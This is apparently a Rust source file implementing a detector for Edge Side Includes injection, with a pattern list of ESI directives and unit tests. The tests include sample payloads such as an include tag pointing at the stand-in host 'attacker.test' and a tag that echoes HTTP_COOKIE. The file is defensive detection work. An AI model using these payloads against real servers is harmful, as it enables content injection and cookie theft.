use memchr::memchr_iter;

#[derive(Debug, Clone, Default)]
pub struct EsiInjectionCmcBuilder;
#[derive(Debug, Clone)]
pub struct EsiInjectionCmc;

impl EsiInjectionCmcBuilder {
    pub fn new() -> Self {
        Self
    }
    pub fn build(self) -> EsiInjectionCmc {
        EsiInjectionCmc
    }
}

const ESI_DIRECTIVES: [(&[u8], &str); 13] = [
    (b"include", "<esi:include"),
    (b"inline", "<esi:inline"),
    (b"debug", "<esi:debug"),
    (b"vars", "<esi:vars"),
    (b"remove", "<esi:remove"),
    (b"choose", "<esi:choose"),
    (b"when", "<esi:when"),
    (b"otherwise", "<esi:otherwise"),
    (b"try", "<esi:try"),
    (b"attempt", "<esi:attempt"),
    (b"except", "<esi:except"),
    (b"comment", "<esi:comment"),
    (b"assign", "<esi:assign"),
];

fn starts_with_ci(hay: &[u8], pat: &[u8]) -> bool {
    hay.len() >= pat.len()
        && hay
            .iter()
            .take(pat.len())
            .zip(pat.iter())
            .all(|(a, b)| a.to_ascii_lowercase() == *b)
}

fn skip_ascii_ws(bytes: &[u8], mut idx: usize) -> usize {
    while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
        idx += 1;
    }
    idx
}

impl EsiInjectionCmc {
    pub fn detect(&self, input: &str) -> Option<String> {
        let bytes = input.as_bytes();
        for idx in memchr_iter(b'<', bytes) {
            if starts_with_ci(&bytes[idx..], b"<!--esi") {
                return Some("<!--esi".to_string());
            }

            let mut cursor = idx + 1;
            if cursor < bytes.len() && bytes[cursor] == b'/' {
                cursor += 1;
            }
            cursor = skip_ascii_ws(bytes, cursor);

            if !starts_with_ci(&bytes[cursor..], b"esi") {
                continue;
            }
            cursor = skip_ascii_ws(bytes, cursor + 3);

            if cursor >= bytes.len() || bytes[cursor] != b':' {
                continue;
            }
            cursor = skip_ascii_ws(bytes, cursor + 1);

            for (directive, label) in ESI_DIRECTIVES {
                if starts_with_ci(&bytes[cursor..], directive) {
                    return Some(label.to_string());
                }
            }
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::EsiInjectionCmcBuilder;

    #[test]
    fn detects_esi_directives_with_case_and_spacing_variants() {
        let cmc = EsiInjectionCmcBuilder::new().build();

        assert_eq!(
            cmc.detect("<esi:include src=\"http://attacker.test/x\" />")
                .as_deref(),
            Some("<esi:include")
        );
        assert_eq!(
            cmc.detect("<ESI:VARS>$(HTTP_COOKIE)</ESI:VARS>").as_deref(),
            Some("<esi:vars")
        );
        assert_eq!(
            cmc.detect("<esi:try><esi:attempt>x</esi:attempt></esi:try>")
                .as_deref(),
            Some("<esi:try")
        );
        assert_eq!(
            cmc.detect("< esi : remove >x</esi:remove>").as_deref(),
            Some("<esi:remove")
        );
        assert_eq!(
            cmc.detect("<!--esi <esi:include src=\"x\" /> -->")
                .as_deref(),
            Some("<!--esi")
        );
    }
}
